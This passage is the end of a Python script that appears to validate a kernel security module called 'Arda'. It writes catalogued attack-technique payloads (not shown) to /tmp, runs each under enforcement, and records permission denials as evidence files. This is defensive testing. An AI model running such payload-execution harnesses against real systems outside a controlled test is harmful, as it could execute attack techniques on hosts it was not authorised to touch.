                rc = (d.get("exec_attempt") or {}).get("rc")
                if rc in (1, 126):
                    existing_techs.add(tid)
            except Exception:
                pass
        print(f"  Skipping {len(existing_techs)} already-observed techniques")

    targets = [
        (ta_id, ta_name, tech_id, payload_src, intent)
        for ta_id, ta_name, tech_id, payload_src, intent in TECHNIQUE_CATALOG
        if tech_id.upper() not in existing_techs
    ]
    print(f"  Running {len(targets)} techniques\n")

    if not targets:
        print("All techniques already have evidence. Done.")
        return 0

    # Write all payloads
    payload_dir = Path("/tmp/arda_prevention_payload")
    payload_dir.mkdir(parents=True, exist_ok=True)

    payload_paths: list[tuple[str, str, str, str, str, Path]] = []
    for ta_id, ta_name, tech_id, payload_src, intent in targets:
        slug = tech_id.replace(".", "_")
        pp = payload_dir / f"{slug}.sh"
        pp.write_text(payload_src, encoding="utf-8")
        pp.chmod(0o755)
        payload_paths.append((ta_id, ta_name, tech_id, payload_src, intent, pp))

    print(f"Wrote {len(payload_paths)} payloads to {payload_dir}")

    if args.dry_run:
        print("\nDRY RUN — not starting enforcement. Payloads written:")
        for _, _, tech_id, _, intent, pp in payload_paths:
            print(f"  {tech_id:20s}  {pp}  — {intent[:60]}")
        return 0

    # Start Arda enforcement
    print(f"\nStarting Arda enforcement ({args.enforce_seconds}s window)...")
    env = os.environ.copy()
    env["ARDA_ENFORCE_SECONDS"] = str(args.enforce_seconds)
    env["ARDA_ENFORCE_DELAY_SECONDS"] = str(args.delay_seconds)
    env["ARDA_LSM_CONTAINER_NAME"] = args.container

    start_proc = subprocess.run(
        f"cd {shlex.quote(str(REPO))} && bash scripts/arda_lsm_start.sh",
        shell=True, env=env, text=True, timeout=60,
    )
    if start_proc.returncode != 0:
        print(f"ERROR: Loader start failed (rc={start_proc.returncode})")
        return 1

    print(f"Loader started. Waiting {args.delay_seconds}s for enforcement to activate...")
    time.sleep(args.delay_seconds + 1)

    enforce_start = NOW()
    deny_count_start = _read_deny_count(args.container)
    print(f"Enforcement active. deny_count baseline: {deny_count_start}")
    print(f"Executing {len(payload_paths)} payloads...\n")

    results: list[dict[str, Any]] = []
    observed_count = 0
    t_start = time.monotonic()

    for i, (ta_id, ta_name, tech_id, _payload_src, intent, pp) in enumerate(payload_paths):
        # Safety check: don't overrun the enforce window
        elapsed = time.monotonic() - t_start
        if elapsed > args.enforce_seconds - 10:
            print(f"  [WARN] Enforce window ending soon ({elapsed:.0f}s elapsed). Stopping at {i}/{len(payload_paths)}")
            break

        exec_rc = None
        exec_stdout = exec_stderr = exec_exception = ""
        try:
            proc = subprocess.run(
                [str(pp)],
                text=True,
                capture_output=True,
                timeout=5,
            )
            exec_rc = proc.returncode
            exec_stdout = proc.stdout or ""
            exec_stderr = proc.stderr or ""
        except PermissionError as e:
            exec_exception = repr(e)
            exec_rc = 126
            exec_stderr = str(e)
        except Exception as e:
            exec_exception = repr(e)
            exec_rc = 1
            exec_stderr = str(e)

        eperm = _detect_eperm(exec_rc, exec_stdout, exec_stderr, exec_exception)
        is_denied = eperm["eperm_confirmed"] or eperm["rc_is_permission_denied"]

        status = "K0:DENIED" if is_denied else f"rc={exec_rc}"
        print(f"  [{i+1:3d}/{len(payload_paths)}] {tech_id:20s} {status}")

        deny_now = _read_deny_count(args.container)
        rec = build_evidence_record(
            ta_id, ta_name, tech_id,
            pp, intent,
            exec_rc, exec_stdout, exec_stderr, exec_exception,
            enforce_start,
            deny_count_start if deny_count_start >= 0 else 0,
            deny_now if deny_now >= 0 else 0,
            substrate,
        )
        results.append(rec)

        if is_denied:
            observed_count += 1
            # Save individual evidence file
            ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
            slug = tech_id.replace(".", "")
            out_path = out_dir / f"arda_prevention_{slug}_{ts}.json"
            out_path.write_text(json.dumps(rec, indent=2, default=str), encoding="utf-8")

    # Stop loader — use list-form to avoid shell=True (which would fork /bin/sh,
    # which may still be blocked if enforcement hasn't fully expired yet).
    print("\nStopping Arda loader...")
    subprocess.run(
        ["/usr/bin/docker", "rm", "-f", args.container],
        text=True, timeout=30,
        capture_output=True,
    )

    # Save summary
    summary_ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    summary_path = out_dir / f"arda_prevention_suite_summary_expanded_{summary_ts}.json"
    summary = {
        "schema": "arda_prevention_suite_summary.v2",
        "captured_at": NOW(),
        "enforce_window_seconds": args.enforce_seconds,
        "techniques_attempted": len(results),
        "observed_k0_denials": observed_count,
        "results": results,
    }
    summary_path.write_text(json.dumps(summary, indent=2, default=str), encoding="utf-8")

    print()
    print("=" * 72)
    print("RESULTS SUMMARY")
    print(f"  Techniques run:       {len(results)}")
    print(f"  K0 (real EPERM):      {observed_count}")
    print(f"  Evidence files:       {out_dir}")
    print(f"  Summary:              {summary_path.name}")
    print("=" * 72)

    if observed_count >= 100:
        print(f"\n✅ PHASE 1 GOAL MET: {observed_count} real K0 kernel denials")
    else:
        print(f"\n⚠ Phase 1 progress: {observed_count} K0 (need 100+). Re-run to accumulate.")

    return 0


if __name__ == "__main__":
    sys.exit(main())
